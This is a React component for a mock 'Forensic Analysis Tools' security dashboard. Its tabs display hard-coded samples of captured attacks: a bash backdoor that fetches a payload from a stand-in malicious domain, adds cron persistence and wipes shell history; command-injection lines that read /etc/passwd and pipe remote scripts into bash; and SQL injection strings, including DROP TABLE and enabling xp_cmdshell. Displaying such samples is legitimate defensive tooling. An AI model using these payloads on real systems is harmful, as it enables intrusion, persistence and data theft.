
import React from 'react';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Search, Terminal, File, Database } from 'lucide-react';

export const ForensicAnalysis: React.FC = () => {
  return (
    <div className="space-y-4">
      <div className="flex justify-between items-center">
        <h3 className="text-lg font-medium">Forensic Analysis Tools</h3>
        <Button className="flex items-center gap-2" variant="outline">
          <Search className="h-4 w-4" />
          Run New Analysis
        </Button>
      </div>
      
      <Tabs defaultValue="payloads">
        <TabsList>
          <TabsTrigger value="payloads" className="flex items-center gap-2">
            <File className="h-4 w-4" />
            Captured Payloads
          </TabsTrigger>
          <TabsTrigger value="commands" className="flex items-center gap-2">
            <Terminal className="h-4 w-4" />
            Command Analysis
          </TabsTrigger>
          <TabsTrigger value="database" className="flex items-center gap-2">
            <Database className="h-4 w-4" />
            Database Artifacts
          </TabsTrigger>
        </TabsList>
        
        <TabsContent value="payloads" className="mt-4">
          <Card>
            <CardContent className="p-4">
              <div className="rounded-lg bg-muted p-4 font-mono text-xs">
                <p className="text-sm font-medium mb-2">Malware Payload (December 12, 2023 14:28:56)</p>
                <div className="overflow-x-auto">
                  <pre>
                    {`#!/bin/bash
# Malicious payload captured from attacker 78.34.156.78
# Payload type: Linux Backdoor

mkdir -p /tmp/.hidden
cd /tmp/.hidden
wget -q http://malicious-domain.net/payload.bin
chmod +x payload.bin
./payload.bin &

# Add persistence
crontab -l | { cat; echo "*/15 * * * * /tmp/.hidden/payload.bin > /dev/null 2>&1"; } | crontab -

# Clean tracks
history -c
rm -f ~/.bash_history`}
                  </pre>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
        
        <TabsContent value="commands" className="mt-4">
          <Card>
            <CardContent className="p-4">
              <div className="rounded-lg bg-muted p-4 font-mono text-xs">
                <p className="text-sm font-medium mb-2">Command Injection (December 12, 2023 14:21:04)</p>
                <div className="overflow-x-auto">
                  <pre>
                    {`# Captured command injection attempt
# Attacker IP: 192.168.43.117
# Target: Web Server Search Field

; cat /etc/passwd
; ls -la /var/www
; curl -s http://malicious-domain.net/payload.sh | bash
; wget http://malicious-domain.net/payload.sh -O /tmp/1.sh && chmod +x /tmp/1.sh && /tmp/1.sh
; uname -a && id`}
                  </pre>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
        
        <TabsContent value="database" className="mt-4">
          <Card>
            <CardContent className="p-4">
              <div className="rounded-lg bg-muted p-4 font-mono text-xs">
                <p className="text-sm font-medium mb-2">SQL Injection (December 12, 2023 14:32:45)</p>
                <div className="overflow-x-auto">
                  <pre>
                    {`-- SQL Injection attempt captured
-- Attacker IP: 192.168.43.117
-- Target: Web Server Login Form

username=' OR 1=1 -- -
username=admin'; DROP TABLE users; --
username='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
username=' UNION SELECT username, password FROM users -- -
username=' AND SLEEP(5) -- -`}
                  </pre>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
};
